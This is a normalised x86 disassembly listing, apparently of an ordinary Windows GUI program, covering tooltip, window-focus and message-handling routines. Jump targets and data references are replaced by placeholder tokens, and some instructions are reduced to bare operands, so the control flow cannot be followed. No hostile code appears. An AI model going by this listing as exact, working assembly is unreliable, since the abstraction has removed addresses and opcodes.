push [ ebp + 0x18 ]
lea edi [ esi + 0xac ]
mov ecx edi
call sub_4422d1
push ebx
mov ecx edi
call sub_442578
push 0x7c
cmp [ ebp + 0x10 ] ebx
mov [ esi + 0xa0 ] sub_43bf2d
je r-xdata
mov eax [ esi + 0xac ]
mov [ esi + 0x68 ] eax
mov [ eax ] bl
push 0x7c
inc eax
jmp r-xdata
push eax
call sub_42e6a3
pop ecx
cmp eax ebx
pop ecx
je r-xdata
sub_43bc39
push ecx
push ecx
push ebp
push esi
mov esi ecx
push edi
push [ esi + 0x78 ]
call [ lstrlenA@IAT ]
mov ecx [ esi + 0x7c ]
inc eax
sub ecx eax
add eax [ esi + 0x78 ]
push ecx
push 0x0
push eax
call sub_42dc30
add esp 0xc
call [ GetFocus@IAT ]
mov ecx esi
mov [ esp + 0xc ] eax
xor edi edi
call sub_43de0e
mov [ esi + 0x60 ] eax
call sub_43eccd
mov eax [ esi + 0x60 ]
mov ebp [ EnableWindow@IAT ]
test eax eax
je r-xdata
push ebx
call sub_453349
test [ esi + 0x92 ] 0x8
mov ebx eax
je r-xdata
push eax
call [ IsWindowEnabled@IAT ]
test eax eax
je r-xdata
push esi
call sub_43ec81
mov [ ebx + 0x18 ] esi
jmp r-xdata
push 0x1
pop edi
push 0x0
push [ esi + 0x60 ]
call ebp
call GetSaveFileNameA
call GetOpenFileNameA
jmp r-xdata
cmp [ esi + 0xa8 ] 0x0
lea eax [ esi + 0x5c ]
push eax
je r-xdata
push [ esp + 0xc ]
call [ IsWindow@IAT ]
test eax eax
je r-xdata
push 0x1
push [ esi + 0x60 ]
call ebp
and [ ebx + 0x18 ] 0x0
mov [ esp + 0x14 ] eax
test edi edi
pop ebx
je r-xdata
mov ecx esi
call sub_43de48
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
test eax eax
jne r-xdata
push [ esp + 0xc ]
call [ SetFocus@IAT ]
pop ecx
pop ecx
retn
push 0x2
pop eax
sub_43bd14
mov eax sub_464a78
call sub_42dc88
push ecx
push ecx
and [ ebp - 0x10 ] 0x0
push ebx
test [ ecx + 0x92 ] 0x8
push esi
push edi
mov [ ebp - 0x14 ] ecx
je r-xdata
push [ ecx + 0x78 ]
mov ecx [ ebp + 0x8 ]
call sub_4421b6
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x10 ] ecx
mov edi [ GetParent@IAT ]
and [ ebp - 0x4 ] 0x0
push eax
call edi
push eax
call sub_43e7b3
mov esi 0x104
lea ecx [ ebp - 0x10 ]
push esi
mov ebx eax
call sub_442578
push eax
push esi
push 0x464
push [ ebx + 0x1c ]
mov ebx [ SendMessageA@IAT ]
call ebx
test eax eax
jge r-xdata
push 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_4425c7
lea ecx [ ebp - 0x10 ]
call sub_4420d3
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_442148
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x14 ]
push [ eax + 0x1c ]
call edi
push eax
call sub_43e7b3
push esi
lea ecx [ ebp - 0x10 ]
mov edi eax
call sub_442578
push eax
push esi
push 0x465
push [ edi + 0x1c ]
call ebx
test eax eax
jge r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax - 0x8 ] 0x0
je r-xdata
push 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_4425c7
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_441ebd
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_442148
jmp r-xdata
lea ecx [ ebp - 0x10 ]
call sub_4420d3
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_43be49
push ebx
mov ebx [ esp + 0x10 ]
push esi
push edi
mov edi [ esp + 0x14 ]
push ebx
push edi
mov esi ecx
push [ esp + 0x18 ]
call sub_43fc81
test eax eax
jne r-xdata
push 0x1
pop eax
mov eax [ edi + 0x8 ]
cmp eax 0xfffffda1
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xe8 ]
cmp eax 0xfffffda2
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xd4 ]
jmp r-xdata
cmp eax 0xfffffda3
je r-xdata
mov [ ebx ] eax
jmp r-xdata
mov edi [ SendMessageA@IAT ]
xor ebx ebx
push ebx
push 0xe146
push 0x111
push [ esi + 0x1c ]
call edi
test eax eax
jne r-xdata
cmp eax 0xfffffda4
je r-xdata
push ebx
push ebx
push 0x365
push [ esi + 0x1c ]
call edi
jmp r-xdata
mov eax [ esi ]
push [ edi + 0x10 ]
mov ecx esi
call [ eax + 0xd0 ]
cmp eax 0xfffffda5
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xe4 ]
jmp r-xdata
cmp eax 0xfffffda6
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xe0 ]
jmp r-xdata
cmp eax 0xfffffda7
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xdc ]
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn 0xc
sub_43bf2d
push ebp
mov ebp esp
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
je r-xdata
xor eax eax
jmp r-xdata
push sub_452fff
mov ecx rw-data
call sub_45518e
mov esi eax
cmp [ esi + 0x18 ] edi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov edi [ ebp + 0xc ]
mov ebx 0x110
cmp edi ebx
jne r-xdata
push [ ebp + 0x8 ]
call sub_43e7da
test eax eax
jne r-xdata
cmp edi [ rw-data ]
mov eax 0x111
je r-xdata
mov esi [ RegisterWindowMessageA@IAT ]
push r--data
call esi
push r--data
mov [ rw-data ] eax
call esi
push r--data
mov [ rw-data ] eax
call esi
push r--data
mov [ rw-data ] eax
call esi
push r--data
mov [ rw-data ] eax
call esi
push r--data
mov [ rw-data ] eax
call esi
push [ ebp + 0x14 ]
mov [ rw-data ] eax
push [ ebp + 0x10 ]
push ebx
push [ ebp + 0x8 ]
call sub_43d8eb
jmp r-xdata
push [ ebp + 0x8 ]
mov ecx [ esi + 0x18 ]
call sub_4414f4
mov [ esi + 0x18 ] edi
push 0x0
push 0xe146
push eax
push [ ebp + 0x8 ]
call [ SendMessageA@IAT ]
push 0x1
pop eax
cmp edi eax
jne r-xdata
cmp edi 0xc000
jb r-xdata
cmp [ ebp + 0x10 ] 0x40e
je r-xdata
push [ ebp + 0x8 ]
call sub_43e7da
mov esi eax
push r--data
mov ecx esi
call sub_442eba
test eax eax
je r-xdata
cmp edi [ rw-data ]
jne r-xdata
test [ esi + 0x92 ] 0x8
jne r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ esi ]
push [ ebp + 0x14 ]
mov ecx esi
call [ eax + 0xd0 ]
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ esi ]
shr ecx 0x10
push ecx
movzx ecx [ ebp + 0x14 ]
push ecx
mov ecx esi
push [ ebp + 0x10 ]
call [ eax + 0xd8 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0xd4 ]
and [ esi + 0x1f4 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov [ esi + 0x1f4 ] eax
mov eax [ esi ]
mov ecx esi
call [ eax + 0xd0 ]
jmp r-xdata
sub_43c0ee
mov eax sub_463174
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
call sub_43effe
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_43ee41
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_43c126
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0xc ]
mov [ ebp - 0x20 ] 0x5
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x14 ]
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x18 ]
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x20 ] 0x7
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x20 ]
push eax
push [ ebp + 0x8 ]
push 0x101b
push [ ecx + 0x1c ]
call [ SendMessageA@IAT ]
leave
retn 0x14
or [ ebp - 0x20 ] 0x8
mov [ ebp - 0xc ] eax
sub_43c179
push ebp
mov ebp esp
sub esp 0x28
mov eax [ ebp + 0x8 ]
and [ ebp - 0x20 ] 0x0
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x28 ]
push eax
push 0x0
push 0x1007
push [ ecx + 0x1c ]
call [ SendMessageA@IAT ]
leave
retn 0x1c
sub_43c1c5
push ebp
mov ebp esp
sub esp 0x28
mov eax [ ebp + 0xc ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x28 ]
push eax
push [ ebp + 0x8 ]
push 0x102e
push [ ecx + 0x1c ]
call [ SendMessageA@IAT ]
leave
retn 0xc
sub_43c1f0
mov eax sub_46319f
call sub_42dc88
sub esp 0x30
and [ ebp - 0x14 ] 0x0
push ebx
push esi
push edi
push 0x28
lea eax [ ebp - 0x3c ]
push 0x0
mov edi ecx
push eax
call sub_42dc30
mov eax [ ebp + 0x10 ]
add esp 0xc
mov [ ebp - 0x34 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
push 0x1
mov esi 0x80
pop ebx
mov [ ebp - 0x4 ] ebx
add esi esi
lea ecx [ ebp - 0x10 ]
push esi
mov [ ebp - 0x24 ] esi
call sub_4425ef
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x3c ]
push eax
push [ ebp + 0xc ]
push 0x102d
push [ edi + 0x1c ]
call [ SendMessageA@IAT ]
lea ecx [ esi - 0x1 ]
cmp eax ecx
je r-xdata
push 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_4425c7
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_441ebd
mov [ ebp - 0x14 ] ebx
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_442148
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0xc
sub_43c298
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x2b
je r-xdata
mov eax [ ecx ]
push [ ebp + 0x10 ]
call [ eax + 0xb8 ]
push 0x1
pop eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_440622
jmp r-xdata
pop ebp
retn 0x10
sub_43c2c6
push esi
push edi
push 0x0
mov edi [ SendMessageA@IAT ]
push [ esp + 0x10 ]
mov esi ecx
push 0x1002
push [ esi + 0x1c ]
call edi
push eax
call sub_43c428
test eax eax
je r-xdata
pop edi
pop esi
retn 0x4
push 0x0
push [ esp + 0x10 ]
push 0x1003
push [ esi + 0x1c ]
call edi
sub_43c2ff
push esi
mov esi ecx
push 0x0
call sub_43c2c6
push 0x1
mov ecx esi
call sub_43c2c6
push 0x2
mov ecx esi
call sub_43c2c6
mov ecx esi
call sub_43eedb
pop esi
retn
sub_43c324
mov eax sub_4631b6
call sub_42dc88
push esi
call sub_4535a1
mov esi eax
cmp [ esi + 0x24 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x24 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_447ab1
call sub_441e77
push 0x48
mov ebx eax
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x4
push r--data
call sub_4434bc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x24 ] eax
call sub_441e77
pop ebx
sub_43c3e8
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_43c324
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x4 ]
call sub_43d5d6
sub_43c463
push 0x10
push r--data
push [ esp + 0x10 ]
call sub_42dcf0
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x4 ]
mov [ ecx ] eax
xor eax eax
push 0x10
push r--data
push [ esp + 0x10 ]
call sub_42dcf0
add esp 0xc
test eax eax
je r-xdata
mov eax 0x80004002
jmp r-xdata
retn 0xc
sub_43c4a7
mov eax sub_46403c
call sub_42dc88
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov ecx [ eax + 0x4 ]
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_447c75
mov ecx [ ebp + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
jmp r-xdata
mov [ ecx ] eax
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
sub_43c4ff
mov eax sub_464048
call sub_42dc88
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
and [ ebp - 0x4 ] 0x0
push edi
mov [ ebp - 0x10 ] esp
push esi
push [ ebp + 0xc ]
call sub_447d84
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] esi
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
sub_43c558
mov eax sub_464054
call sub_42dc88
push ecx
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x10 ] esp
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov esi [ ecx + 0x20 ]
cmp esi edi
jne r-xdata
cmp [ ebp + 0x10 ] 0xffffffff
jne r-xdata
call sub_447e14
push [ ebp + 0x14 ]
mov eax [ esi ]
mov ecx esi
mov [ ebp - 0x4 ] edi
push [ ebp + 0xc ]
call [ eax + 0x28 ]
mov ecx [ ebp + 0x18 ]
cmp ecx edi
je r-xdata
mov eax 0x80004001
jmp r-xdata
cmp [ ebp + 0xc ] edi
jge r-xdata
xor eax eax
jmp r-xdata
mov [ ecx + 0x4 ] edi
mov [ ecx ] eax
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x14
sub_43c5fe
mov eax sub_464aa0
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_43e388
and [ ebp - 0x4 ] 0x0
push 0xa
lea ecx [ esi + 0x3c ]
call sub_43d68a
mov ecx [ ebp - 0xc ]
mov [ esi ] r--data
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_43c653
push ebx
push esi
push edi
mov ebx ecx
push 0x1000
call sub_44121e
mov edi [ esp + 0x10 ]
xor esi esi
cmp edi esi
jne r-xdata
mov eax [ edi + 0x1c ]
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn 0x8
cmp edi esi
je r-xdata
mov ecx [ esp + 0x14 ]
push esi
push esi
push eax
mov eax 0x80000000
push eax
push eax
push eax
or ecx eax
push eax
push ecx
push esi
push r--data
push esi
mov ecx ebx
call sub_43ed0f
cmp eax esi
je r-xdata
mov [ ebx + 0x20 ] esi
mov esi [ edi + 0x1c ]
sub_43c6a8
mov eax sub_464abf
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
call sub_43effe
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x3c ]
call sub_43d764
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_43ee41
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_43c6ef
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0x58 ]
test esi esi
je r-xdata
push 0x1
pop eax
pop esi
retn
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x4 ]
sub_43c709
push ebp
mov ebp esp
sub esp 0x2c
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov ebx ecx
push 0xb
pop ecx
lea edi [ ebp - 0x2c ]
[ edi ] [ esi ]
xor edi edi
cmp [ ebp - 0xc ] edi
jne r-xdata
mov eax [ ebx ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx ebx
push [ ebp + 0x8 ]
push 0x404
call [ eax + 0xa0 ]
pop edi
pop esi
pop ebx
leave
retn 0x8
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
cmp [ ebp - 0x8 ] edi
je r-xdata
lea eax [ ebp + 0xc ]
lea esi [ ebx + 0x3c ]
push eax
mov ecx esi
push [ ebp - 0x8 ]
call sub_43d845
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx esi
push eax
push [ ebp - 0x8 ]
call sub_43d867
push [ ebp - 0x8 ]
mov ecx esi
call sub_43d889
mov [ eax ] edi
sub_43c7ab
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
push edi
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
mov ecx [ eax + 0x4 ]
push ecx
mov [ ebp - 0x4 ] ecx
push [ eax ]
call [ WindowFromPoint@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
leave
retn 0x8
push esi
call [ GetParent@IAT ]
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push esi
call [ ScreenToClient@IAT ]
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push esi
call sub_44791e
mov edi eax
test edi edi
je r-xdata
push 0x2
push edi
call sub_4478a9
test eax eax
je r-xdata
mov eax esi
push edi
call [ IsWindowEnabled@IAT ]
test eax eax
mov eax edi
je r-xdata
mov eax edi
jmp r-xdata
sub_43c81e
push ebp
mov ebp esp
sub esp 0x2c
push ebx
push esi
push edi
mov esi ecx
call sub_453349
cmp [ ebp + 0x8 ] 0x0
mov edi [ eax + 0xcc ]
jne r-xdata
mov edi [ ebp + 0xc ]
test [ esi + 0x24 ] edi
jne r-xdata
mov ebx [ ebp + 0xc ]
test [ esi + 0x24 ] ebx
je r-xdata
push 0x1
pop eax
pop edi
pop esi
pop ebx
leave
retn 0x8
call sub_45357b
mov [ eax + 0x1034 ] sub_43c951
or [ esi + 0x24 ] edi
cmp [ eax + 0xd0 ] esi
jne r-xdata
test edi edi
je r-xdata
push 0x1
call sub_43f0b5
not ebx
and [ esi + 0x24 ] ebx
jmp r-xdata
cmp [ edi + 0x1c ] 0x0
je r-xdata
push 0x2c
lea eax [ ebp - 0x2c ]
push 0x0
push eax
call sub_42dc30
mov eax [ esi + 0x1c ]
add esp 0xc
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x2c ] 0x28
push eax
push 0x0
push 0x405
mov [ ebp - 0x28 ] 0x1
push [ edi + 0x1c ]
call [ SendMessageA@IAT ]
sub_43c8cf
push ebp
mov ebp esp
sub esp 0x24
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
push 0x7
mov esi ebx
pop ecx
lea edi [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
[ edi ] [ esi ]
mov edi [ ebp + 0x8 ]
mov esi [ SendMessageA@IAT ]
push eax
push 0x0
push 0x410
push [ edi + 0x1c ]
call esi
mov ecx [ ebx + 0x14 ]
cmp [ ebp - 0x20 ] 0x200
mov [ ebp - 0x8 ] ecx
mov ecx [ ebx + 0x18 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x4 ] ecx
jb r-xdata
movzx eax [ ebp - 0x4 ]
movzx ecx [ ebp - 0x8 ]
shl eax 0x10
or eax ecx
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x407
push [ edi + 0x1c ]
call esi
pop edi
pop esi
pop ebx
leave
retn 0x8
cmp [ ebp - 0x20 ] 0x209
ja r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push eax
call [ ScreenToClient@IAT ]
sub_43c961
mov eax sub_464ad5
call sub_42dc88
sub esp 0x74
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov esi [ ebx + 0x4 ]
mov edi ecx
cmp esi 0x200
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x1c ] esi
je r-xdata
mov esi [ GetKeyState@IAT ]
push 0x1
call esi
test ax ax
jl r-xdata
cmp esi 0xa0
je r-xdata
mov esi [ ebp - 0x1c ]
push 0x2
call esi
test ax ax
jl r-xdata
cmp esi 0x202
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
push [ ebx ]
push 0x4
call esi
test ax ax
jl r-xdata
cmp esi 0x205
je r-xdata
cmp eax edi
jne r-xdata
cmp eax edi
je r-xdata
push [ ebx ]
cmp esi 0x208
jne r-xdata
cmp esi 0x100
jb r-xdata
test [ eax + 0x24 ] 0x401
jne r-xdata
cmp eax edi
je r-xdata
test [ eax + 0x24 ] 0x401
jne r-xdata
test [ edi + 0x24 ] 0x401
je r-xdata
cmp esi 0x104
jb r-xdata
cmp esi 0x108
jbe r-xdata
push [ eax + 0x1c ]
call [ GetParent@IAT ]
push eax
jmp r-xdata
push sub_452fff
mov ecx rw-data
call sub_45518e
mov esi eax
mov ecx edi
mov [ ebp - 0x18 ] esi
mov ebx [ esi + 0xcc ]
call sub_43fda6
test ebx ebx
mov [ ebp - 0x14 ] eax
je r-xdata
test eax eax
jne r-xdata
push [ eax + 0x1c ]
call [ GetParent@IAT ]
push eax
jmp r-xdata
xor eax eax
cmp esi 0x107
ja r-xdata
push 0x1
pop eax
jmp r-xdata
call sub_43e7b3
test eax eax
je r-xdata
push 0x58
call sub_441e89
pop ecx
mov [ ebp - 0x1c ] eax
xor ebx ebx
cmp eax ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov ecx ebx
call sub_420960
cmp eax [ ebp - 0x14 ]
je r-xdata
push sub_452fff
mov ecx rw-data
call sub_45518e
and [ eax + 0xd0 ] 0x0
or [ eax + 0xd4 ] 0xffffffff
jmp r-xdata
call sub_43e7b3
test eax eax
je r-xdata
test eax eax
jne r-xdata
test [ edi + 0x25 ] 0x4
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push 0x1
push [ ebp - 0x14 ]
mov ecx ebx
call sub_43c653
test eax eax
jne r-xdata
mov ecx eax
call sub_43c5fe
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x58 ]
mov eax [ ebx ]
push 0x1
mov ecx ebx
call [ eax + 0x4 ]
xor ebx ebx
mov [ esi + 0xcc ] ebx
push eax
call sub_43f0b5
cmp esi 0x201
je r-xdata
push 0x0
push 0x0
push 0x401
push [ ebx + 0x1c ]
call [ SendMessageA@IAT ]
mov edi [ ebp - 0x10 ]
mov [ esi + 0xcc ] ebx
test ebx ebx
je r-xdata
push 0x2c
lea eax [ ebp - 0x54 ]
push 0x0
push eax
call sub_42dc30
mov eax [ edi + 0x1c ]
add esp 0xc
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x54 ] 0x28
push eax
push 0x0
push 0x408
mov [ ebp - 0x50 ] 0x1
push [ ebx + 0x1c ]
call [ SendMessageA@IAT ]
test eax eax
jne r-xdata
cmp esi 0x203
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x28 ]
push eax
mov [ ebp - 0x28 ] ecx
push [ edi + 0x1c ]
call [ ScreenToClient@IAT ]
push 0x2c
lea eax [ ebp - 0x80 ]
push 0x0
push eax
call sub_42dc30
add esp 0xc
mov eax [ edi ]
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x80 ] 0x28
push ecx
mov ecx edi
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
call [ eax + 0x64 ]
mov ecx eax
mov [ ebp - 0x1c ] eax
inc ecx
neg ecx
sbb ecx ecx
and ecx edi
cmp [ esi + 0xd4 ] eax
mov [ ebp - 0x14 ] ecx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
push 0x0
push 0x404
push [ ebx + 0x1c ]
call [ SendMessageA@IAT ]
mov eax [ ebx ]
push 0x1
mov ecx ebx
call [ eax + 0x4 ]
jmp r-xdata
cmp esi 0x204
je r-xdata
cmp eax 0xffffffff
je r-xdata
cmp [ esi + 0xd0 ] ecx
jne r-xdata
cmp esi 0x206
je r-xdata
push 0x0
push 0x0
push 0x401
push [ ebx + 0x1c ]
call [ SendMessageA@IAT ]
jmp r-xdata
mov eax [ ebp - 0x7c ]
push 0xb
pop ecx
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x54 ]
and eax 0x3fffffff
[ edi ] [ esi ]
mov ecx [ ebp - 0x10 ]
mov edi 0x400
mov [ ebp - 0x50 ] eax
test [ ecx + 0x24 ] edi
je r-xdata
test [ edi + 0x25 ] 0x4
je r-xdata
cmp esi 0x207
je r-xdata
push [ ebp + 0x8 ]
push ebx
call sub_43c8cf
cmp [ esi + 0xd8 ] 0x28
lea edi [ esi + 0xd8 ]
jb r-xdata
lea eax [ ebp - 0x54 ]
xor esi esi
push eax
push esi
push 0x404
push [ ebx + 0x1c ]
call [ SendMessageA@IAT ]
test [ ebp - 0x79 ] 0x40
jne r-xdata
or al 0x20
mov [ ebp - 0x50 ] eax
cmp eax 0xffffffff
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
call [ GetCursorPos@IAT ]
movzx eax [ ebp - 0x1c ]
movzx ecx [ ebp - 0x20 ]
shl eax 0x10
or eax ecx
push eax
push 0x0
push 0x412
push [ ebx + 0x1c ]
call [ SendMessageA@IAT ]
jmp r-xdata
cmp esi 0x209
je r-xdata
mov eax [ ebp - 0x14 ]
push 0xb
mov [ esi + 0xd0 ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0xd4 ] eax
pop ecx
lea esi [ ebp - 0x80 ]
[ edi ] [ esi ]
push edi
push 0x0
push 0x405
push [ ebx + 0x1c ]
call [ SendMessageA@IAT ]
push esi
push 0x1
push 0x401
push [ ebx + 0x1c ]
call [ SendMessageA@IAT ]
mov eax [ ebp - 0x10 ]
test [ eax + 0x24 ] edi
je r-xdata
mov ecx [ ebp - 0x10 ]
call sub_43fdea
test eax eax
je r-xdata
cmp [ ebp - 0x5c ] 0xffffffff
je r-xdata
push [ ebp + 0x8 ]
push ebx
call sub_43c8cf
jmp r-xdata
cmp esi 0xa1
je r-xdata
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
push 0x213
push esi
push esi
push esi
push esi
push esi
push [ ebx + 0x1c ]
call [ SetWindowPos@IAT ]
lea eax [ ebp - 0x54 ]
push eax
push 0x1
push 0x411
push [ ebx + 0x1c ]
call [ SendMessageA@IAT ]
mov esi [ ebp - 0x18 ]
cmp esi 0xa3
je r-xdata
push [ ebp - 0x5c ]
call sub_42ded6
pop ecx
jmp r-xdata
cmp esi 0xa4
je r-xdata
cmp esi 0xa6
je r-xdata
cmp esi 0xa7
je r-xdata
cmp esi 0xa9
jne r-xdata
sub_43ce0c
push esi
mov esi ecx
push edi
xor edi edi
mov ecx [ esi + 0x14 ]
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] edi
call sub_43d183
mov [ esi + 0x14 ] edi
pop edi
pop esi
retn
sub_43ce55
push esi
mov esi ecx
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
mov [ esi + 0x10 ] ecx
mov ecx [ esp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esp + 0xc ]
mov [ eax ] ecx
inc [ esi + 0xc ]
and [ eax + 0x8 ] 0x0
pop esi
retn 0x8
push 0xc
lea eax [ esi + 0x14 ]
push [ esi + 0x18 ]
push eax
call sub_43d163
mov ecx [ esi + 0x18 ]
add eax 0x4
lea edx [ ecx + ecx * 2 ]
dec ecx
test ecx ecx
lea eax [ eax + edx * 4 - 0xc ]
jl r-xdata
inc ecx
mov edx [ esi + 0x10 ]
mov [ eax ] edx
